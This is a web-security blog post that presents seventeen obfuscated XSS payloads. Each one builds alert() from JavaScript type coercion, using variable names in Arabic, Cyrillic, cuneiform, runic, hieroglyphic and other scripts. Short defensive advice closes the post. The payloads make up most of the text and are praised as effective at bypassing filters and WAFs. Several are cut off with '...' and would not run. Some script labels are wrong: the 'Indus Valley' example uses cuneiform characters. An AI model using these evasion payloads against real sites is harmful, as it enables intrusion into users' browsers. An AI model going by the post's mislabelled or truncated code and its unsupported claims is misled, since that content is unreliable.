---
title: "XSS Payloads in Ancient and Global Script"
image: "images/blog/xss.png"
date: "2025-10-5"
excerpt: "Cross-Site Scripting (XSS) remains one of the most pervasive and dangerous web vulnerabilities. While traditional payloads often rely on ASCII characters like `<script>alert(1)</script>`, attackers have long sought creative ways to bypass input filters, WAFs (Web Application Firewalls), and human scrutiny. One particularly fascinating—and sometimes alarming—technique involves writing JavaScript payloads using non-Latin or even ancient scripts. This article explores a collection of such payloads, demonstrating how the universal nature of JavaScript can be exploited through linguistic and typographic diversity."
category: "Web security"
---

# The Art of Obfuscation: XSS Payloads in Ancient and Global Scripts

Cross-Site Scripting (XSS) remains one of the most pervasive and dangerous web vulnerabilities. While traditional payloads often rely on ASCII characters like `<script>alert(1)</script>`, attackers have long sought creative ways to bypass input filters, WAFs (Web Application Firewalls), and human scrutiny. One particularly fascinating—and sometimes alarming—technique involves writing JavaScript payloads using non-Latin or even ancient scripts. This article explores a collection of such payloads, demonstrating how the universal nature of JavaScript can be exploited through linguistic and typographic diversity.

## How These Payloads Work

Before diving into the examples, it's essential to understand the underlying trick. These payloads use **JavaScript’s type coercion and property access mechanics** to construct strings like `"constructor"` and `"alert"` without directly typing them. Here's a simplified breakdown:

1. **Empty string initialization**: `a = ''`
2. **Boolean coercion**: `b = !a + a` → `"false"`
3. **Object coercion**: `c = a + {}` → `"[object Object]"`
4. **Indexing strings**: Extract characters like `'a'`, `'l'`, `'e'`, `'r'`, `'t'`, `'c'`, `'o'`, `'n'`, `'s'`, `'t'`, `'r'`, `'u'`
5. **Dynamic function construction**: Use bracket notation to call `constructor` on a function, then invoke it with `eval`-like behavior

This technique—often called **JSFuck** or **minimal JS obfuscation**—relies entirely on six characters: `[`, `]`, `(`, `)`, `!`, and `+`. But when you replace Latin variable names (`a`, `b`, `c`) with characters from other scripts, the payload becomes visually exotic while remaining functionally identical.

Below, we present and analyze a curated list of such payloads across diverse writing systems—from modern national scripts to undeciphered ancient alphabets.

---

## 1. **Arabic Script (ا ب ت ث...)**

```javascript
ا='',ب=!ا+ا,ت=!ب+ا,ث=ا+{},ج=ب[ا++],ح=ب[خ=ا],د=++خ+ا,ذ=ث[خ+د],ب[ذ+=ث[ا]+(ب.ت+ث)[ا]+ت[د]+ج+ح+ب[خ]+ذ+ج+ث[ا]+ح][ذ](ت[ا]+ت[خ]+ب[د]+ح+ج+"(1)")()
```

Using Arabic letters (ا for `a`, ب for `b`, etc.), this payload constructs and executes `alert(1)`. Arabic is read right-to-left, which can further confuse log parsers or manual reviewers unfamiliar with bidirectional text handling in browsers.

---

## 2. **Cyrillic (Russian) Script (а б в г...)**

```javascript
а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а],з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")()
```

Here, Cyrillic characters mimic Latin variable names. The payload alerts `'взломано'` ("hacked" in Russian). Such obfuscation can evade naive keyword filters that only scan for English terms like "alert" or "hack".

---

## 3. **Ancient Greek (α β γ δ...)**

```javascript
α='',β=!α+α,γ=!β+α,δ=α+{},ε=β[α++],ζ=β[ι=α],η=++ι+α,θ=δ[ι+η],β[θ+=δ[α]+(β.γ+δ)[α]+γ[η]+ε+ζ+β[ι]+θ+ε+δ[α]+ζ][θ](γ[α]+γ[ι]+β[η]+ζ+ε+"('Ĥαcεκd βγ γαssιη')")()
```

Using Greek letters, this payload mixes classical typography with a playful misspelling of "Hacked by Yassin". Ancient scripts often bypass filters that assume only modern Latin or common Unicode blocks are used in code.

---

## 4. **Cuneiform (𒀀 𒀁 𒀂...)**

```javascript
𒀀='',𒀁=!𒀀+𒀀,𒀂=!𒀁+𒀀,𒀃=𒀀+{},𒀄=𒀁[𒀀++],𒀅=𒀁[𒀆=𒀀],𒀇=++𒀆+𒀀,𒀈=𒀃[𒀆+𒀇],𒀁[𒀈+=𒀃[𒀀]+(𒀁.𒀂+𒀃)[𒀀]+𒀂[𒀇]+𒀄+𒀅+𒀁[𒀆]+𒀈+𒀄+𒀃[𒀀]+𒀅][𒀈](𒀂[𒀀]+𒀂[𒀆]+𒀁[𒀇]+𒀅+𒀄+"('𒀭𒅆𒀀𒊕𒆳𒄿𒀀𒀸𒅋𒉌𒆠𒄑𒊮𒀀𒀭𒂗𒆠𒋛𒀀𒈨𒄿')")()
```

One of the earliest writing systems, cuneiform (used in ancient Mesopotamia), is repurposed here as variable identifiers. The payload even includes a message in cuneiform glyphs—though their semantic meaning is irrelevant; they’re just visually striking strings.

---

## 5. **Indus Valley Script (𒀱 𒁍 𒂖...)**

```javascript
𒀱='',𒁍=!𒀱+𒀱,𒂖=!𒁍+𒀱,𒃵=𒀱+{},𒄿=𒁍[𒀱++],𒅗=𒁍[𒀲=𒀱],𒆜=++𒀲+𒀱,𒇻=𒃵[𒀲+𒆜],𒁍[𒇻+=𒃵[𒀱]+(𒁍.𒂖+𒃵)[𒀱]+𒂖[𒆜]+𒄿+𒅗+𒁍[𒀲]+𒇻+𒄿+𒃵[𒀱]+𒅗][𒇻](𒂖[𒀱]+𒂖[𒀲]+𒁍[𒆜]+𒅗+𒄿+"('𒀱𒀲𒀱𒋻𒆜𒀲𒁂𒐫𒉿𒀜𒅔')")()
```

The undeciphered script of the Indus Valley Civilization adds an air of mystery. Since these symbols aren’t used in modern computing, many security tools don’t account for them—making such payloads surprisingly effective at bypassing detection.

---

## 6. **Inuktitut Syllabics (ᐊ ᐃ ᐅ...)**

```javascript
ᐊ='',ᐃ=!ᐊ+ᐊ,ᐅ=!ᐃ+ᐊ,ᐱ=ᐊ+{},ᑎ=ᐃ[ᐊ++],ᓇ=ᐃ[ᓕ=ᐊ],ᓯ=++ᓕ+ᐊ,ᓂ=ᐱ[ᓕ+ᓯ],ᐃ[ᓂ+=ᐱ[ᐊ]+(ᐃ.ᐅ+ᐱ)[ᐊ]+ᐅ[ᓯ]+ᑎ+ᓇ+ᐃ[ᓕ]+ᓂ+ᑎ+ᐱ[ᐊ]+ᓇ][ᓂ](ᐅ[ᐊ]+ᐅ[ᓕ]+ᐃ[ᓯ]+ᓇ+ᑎ+"('ᐊᐃᓐᓇᓂᐅᑦ ᐱᔭᓯᓕᖅ')")()
```

Used by Inuit communities in Canada, Inuktitut syllabics are phonetic and visually distinct. The payload alerts `'ᐊᐃᓐᓇᓂᐅᑦ ᐱᔭᓯᓕᖅ'` ("We have been hacked" in Inuktitut), blending cultural representation with exploit delivery.

---

## 7. **Glagolitic (Ⰰ Ⰱ Ⰲ...)**

```javascript
Ⰰ='',Ⰱ=!Ⰰ+Ⰰ,Ⰲ=!Ⰱ+Ⰰ,Ⰳ=Ⰰ+{},Ⰴ=Ⰱ[Ⰰ++],Ⰵ=Ⰱ[Ⰶ=Ⰰ],Ⰷ=++Ⰶ+Ⰰ,Ⰸ=Ⰳ[Ⰶ+Ⰷ],Ⰱ[Ⰸ+=Ⰳ[Ⰰ]+(Ⰱ.Ⰲ+Ⰳ)[Ⰰ]+Ⰲ[Ⰷ]+Ⰴ+Ⰵ+Ⰱ[Ⰶ]+Ⰸ+Ⰴ+Ⰳ[Ⰰ]+Ⰵ][Ⰸ](Ⰲ[Ⰰ]+Ⰲ[Ⰶ]+Ⰱ[Ⰷ]+Ⰵ+Ⰴ+"('ⰀⰁⰂⰃⰄⰅⰆⰇⰈ')")()
```

The oldest known Slavic alphabet, Glagolitic, is rarely seen today. Its use here is purely aesthetic—but highly effective at evading signature-based detection.

---

## 8. **Linear B (𐀀 𐀁 𐀂...)**

```javascript
𐀀='',𐀁=!𐀀+𐀀,𐀂=!𐀁+𐀀,𐀃=𐀀+{},𐀄=𐀁[𐀀++],𐀅=𐀁[𐀆=𐀀],𐀇=++𐀆+𐀀,𐀈=𐀃[𐀆+𐀇],𐀁[𐀈+=𐀃[𐀀]+(𐀁.𐀂+𐀃)[𐀀]+𐀂[𐀇]+𐀄+𐀅+𐀁[𐀆]+𐀈+𐀄+𐀃[𐀀]+𐀅][𐀈](𐀂[𐀀]+𐀂[𐀆]+𐀁[𐀇]+𐀅+𐀄+"('𐀀𐀁𐀂𐀃𐀄 𐀅𐀆𐀇𐀈')")()
```

Used for Mycenaean Greek (~1400 BCE), Linear B glyphs create a payload that looks like archaeological transcription—but executes as valid JavaScript.

---

## 9. **Runic (ᚠ ᚢ ᚦ...)**

```javascript
ᚠ='',ᚢ=!ᚠ+ᚠ,ᚦ=!ᚢ+ᚠ,ᚨ=ᚠ+{},ᚱ=ᚢ[ᚠ++],ᚲ=ᚢ[ᚷ=ᚠ],ᚹ=++ᚷ+ᚠ,ᚺ=ᚨ[ᚷ+ᚹ],ᚢ[ᚺ+=ᚨ[ᚠ]+(ᚢ.ᚦ+ᚨ)[ᚠ]+ᚦ[ᚹ]+ᚱ+ᚲ+ᚢ[ᚷ]+ᚺ+ᚱ+ᚨ[ᚠ]+ᚲ][ᚺ](ᚦ[ᚠ]+ᚦ[ᚷ]+ᚢ[ᚹ]+ᚲ+ᚱ+"('ᛞᚾᛋᚨᛏᛡᚠᛚᛖᚺᛋᛉᛏᚱ')")()
```

The Elder Futhark runes lend a mystical aura. The message spells a garbled "DNsatZflEhsZtr"—likely a stylized signature.

---

## 10. **Yi Script (ꆈ ꌠ ꁱ...)**

```javascript
ꆈ='',ꌠ=!ꆈ+ꆈ,ꁱ=!ꌠ+ꆈ,ꁯ=ꆈ+{},ꉬ=ꌠ[ꆈ++],ꃅ=ꌠ[ꋍ=ꆈ],ꇁ=++ꋍ+ꆈ,ꊰ=ꁯ[ꋍ+ꇁ],ꌠ[ꊰ+=...][ꊰ](..."('ꆈꌠꁱꁯꉬꃅꋍꇁꊰ...')")()
```

Used by the Yi people of Southwest China, this syllabic script creates a payload that’s both functional and culturally resonant.

---

## 11. **Egyptian Hieroglyphs (𓀀 𓁹 𓆣...)**

```javascript
𓀀='',𓁹=!𓀀+𓀀,𓆣=!𓁹+𓀀,𓉐=𓀀+{},𓂀=𓁹[𓀀++],𓏏=𓁹[𓀂=𓀀],𓎛=++𓀂+𓀀,𓅓=𓉐[𓀂+𓎛],𓁹[𓅓+=...][𓅓](..."('𓀀𓁹𓆣𓉐𓂀𓏏𓎛𓅓')")()
```

Perhaps the most visually dramatic, this payload uses authentic Egyptian hieroglyphs from Unicode’s Egyptian Hieroglyphs block (U+13000–U+1342F). It’s a testament to Unicode’s inclusivity—and a warning about its security implications.

---

## 12. **Japanese Hiragana (あ い う...)**

```javascript
あ='',い=!あ+あ,う=!い+あ,え=あ+{},お=い[あ++],か=い[き=あ],く=++き+あ,け=え[き+く],い[け+=...][け](..."('ハッキングされました')")()
```

Mixing hiragana variables with a katakana alert message (`'ハッキングされました'` = "You have been hacked"), this payload targets Japanese-language applications or users.

---

## 13. **Chinese Characters (甲 乙 丙...)**

```javascript
甲='',乙=!甲+甲,丙=!乙+甲,丁=甲+{},戊=乙[甲++],己=乙[庚=甲],辛=++庚+甲,壬=丁[庚+辛],乙[壬+=...][壬](..."('被攻擊了')")()
```

Using the traditional Chinese **Heavenly Stems** (甲, 乙, 丙...), this payload alerts `'被攻擊了'` ("Attacked!"). It demonstrates how even logographic scripts can serve as variable names.

---

## 14. **Mathematical Alphanumeric Symbols**

```javascript
𝒜='',ℬ=!𝒜+𝒜,𝒞=!ℬ+𝒜,...[ℐ](..."('𝓱𝓪𝓬𝓴𝓮𝓭 𝓫𝔂 𝔂𝓪𝓼𝓼𝓲𝓷')")()
```

Unicode includes stylized Latin letters (e.g., `𝒜`, `ℬ`, `𝒞`) for mathematical notation. These are fully valid JavaScript identifiers and can bypass filters that don’t normalize Unicode.

---

## 15. **Fullwidth Latin (Ａ Ｂ Ｃ...)**

```javascript
Ａ='',Ｂ=!Ａ+Ａ,Ｃ=!Ｂ+Ａ,...[Ｉ](..."('H̶̦͇͓͔͙͔̜͕̬̗̦̜̹͎̝̟̥̊̆͊̈̿͆͐a̵̝̤̓̆̅̒̄͂͌̃͌̕͝͝č̷̡̡̡̛̳̱̠̫͓͕͕͔́͒͑̉͑̓̓͘͘͜͜͝k̷̢͈͖̫̐̓̊̊͊͑̒̊̄̎̽̕͘͘͝...')")()
```

Fullwidth characters (Ａ instead of A) are common in East Asian typography. Combined with Zalgo text (combining diacritics), this payload becomes nearly unreadable—yet still executable.

---

## 16. **Greek Extended & Symbols**

```javascript
λ='',ψ=!λ+λ,χ=!ψ+λ,Ϟ=λ+{},...[ϣ](..."('⟊⟒⫯⫸⧉⧬⩣⪬⨀⩘⫛⟆⧆⧈⪻⫷⩚⟟')")()
```

Using archaic Greek letters and mathematical symbols, this payload pushes the boundaries of identifier syntax.

---

## 17. **Kaomoji + Unicode Mix**

```javascript
ツ='',ಠ=!ツ+ツ,益=!ಠ+ツ,...[凸](..."('(☞ﾟヮﾟ)☞ Hacked By Yassin ☜(ﾟヮﾟ☜)')")()
``>

Combining Japanese emoticons (ツ, 益), Kannada letters (ಠ), and kaomoji, this payload is both humorous and effective—showing that obfuscation can be playful.

---

## Security Implications

These examples highlight critical lessons for defenders:

- **Never assume input is "safe" because it uses non-Latin scripts.**
- **Normalize and validate all Unicode input.** Consider restricting identifier characters to ASCII in sensitive contexts.
- **Use Content Security Policy (CSP)** to mitigate XSS impact, regardless of payload encoding.
- **Log and monitor for unusual Unicode usage** in HTTP parameters, headers, and cookies.

## Conclusion

From cuneiform tablets to Japanese emoticons, the adaptability of JavaScript—and the creativity of attackers—knows no bounds. These payloads are not just curiosities; they are real-world evasion techniques. Understanding them is crucial for building robust, inclusive, and secure web applications in a globalized digital landscape.

> **Remember**: In the arms race between attackers and defenders, obfuscation evolves—but so must our vigilance.
